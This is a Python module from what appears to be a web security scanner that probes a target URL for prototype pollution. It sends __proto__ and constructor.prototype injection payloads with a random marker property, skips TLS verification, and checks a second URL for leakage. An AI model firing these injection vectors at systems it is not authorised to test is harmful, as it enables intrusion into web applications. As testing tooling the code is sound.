"""
Execution logic for prototype_pollution_probe: sends a bounded set of
__proto__/constructor.prototype injection vectors (query params and JSON
body) carrying a unique marker property, then optionally re-checks a
separate verify_url for the marker leaking across a shared global
object. Purely in-memory/observational -- no persistent storage is
targeted. No parsing here -- that's parse.py's job.
"""
from __future__ import annotations

import json
import secrets
import urllib.parse
from dataclasses import dataclass, field
from typing import Dict, List, Optional

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

DEFAULT_TIMEOUT = 10
MAX_BODY_BYTES = 200_000


@dataclass
class RawPollutionAttempt:
    vector: str
    marker_property: str
    status_code: int = 0
    body: str = ""
    error: Optional[str] = None


@dataclass
class RawPrototypePollutionResult:
    target: str = ""
    marker_property: str = ""
    marker_value: str = ""
    attempts: List[RawPollutionAttempt] = field(default_factory=list)
    verify_status_code: Optional[int] = None
    verify_body: str = ""
    verify_error: Optional[str] = None
    error: Optional[str] = None


def _build_vectors(marker_property: str, baseline_body: Dict) -> "tuple[List[Dict[str, object]], str]":
    marker_value = f"tradecraft-{secrets.token_hex(4)}"
    vectors = [
        {"vector": "query___proto__", "kind": "query", "params": {f"__proto__[{marker_property}]": marker_value}},
        {"vector": "query_constructor_prototype", "kind": "query", "params": {f"constructor[prototype][{marker_property}]": marker_value}},
        {"vector": "json___proto__", "kind": "json", "body": {**baseline_body, "__proto__": {marker_property: marker_value}}},
        {"vector": "json_constructor_prototype", "kind": "json", "body": {**baseline_body, "constructor": {"prototype": {marker_property: marker_value}}}},
    ]
    return vectors, marker_value


def execute(
    target: str,
    verify_url: Optional[str] = None,
    body: Optional[str] = None,
    timeout: int = DEFAULT_TIMEOUT,
) -> RawPrototypePollutionResult:
    if requests is None:
        return RawPrototypePollutionResult(target=target, error="requests library not available")

    try:
        baseline_body = json.loads(body) if body else {}
        if not isinstance(baseline_body, dict):
            raise ValueError("body must decode to a JSON object")
    except Exception as exc:
        return RawPrototypePollutionResult(target=target, error=f"invalid baseline 'body' JSON: {exc}")

    marker_property = f"tradecraftPolluted{secrets.token_hex(3)}"
    vectors, marker_value = _build_vectors(marker_property, baseline_body)

    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Tradecraft/1.0"}
    attempts: List[RawPollutionAttempt] = []
    for v in vectors:
        try:
            if v["kind"] == "query":
                resp = requests.get(target, params=v["params"], headers=headers, timeout=timeout, verify=False)
            else:
                resp = requests.post(target, json=v["body"], headers=headers, timeout=timeout, verify=False)
            attempts.append(RawPollutionAttempt(
                vector=v["vector"], marker_property=marker_property,
                status_code=resp.status_code, body=(resp.text or "")[:MAX_BODY_BYTES],
            ))
        except requests.RequestException as exc:
            attempts.append(RawPollutionAttempt(vector=v["vector"], marker_property=marker_property, error=str(exc)))
        except Exception as exc:
            attempts.append(RawPollutionAttempt(vector=v["vector"], marker_property=marker_property, error=f"{type(exc).__name__}: {exc}"))

    result = RawPrototypePollutionResult(target=target, marker_property=marker_property, marker_value=marker_value, attempts=attempts)

    if verify_url:
        try:
            verify_resp = requests.get(verify_url, headers=headers, timeout=timeout, verify=False)
            result.verify_status_code = verify_resp.status_code
            result.verify_body = (verify_resp.text or "")[:MAX_BODY_BYTES]
        except requests.RequestException as exc:
            result.verify_error = str(exc)
        except Exception as exc:
            result.verify_error = f"{type(exc).__name__}: {exc}"

    return result
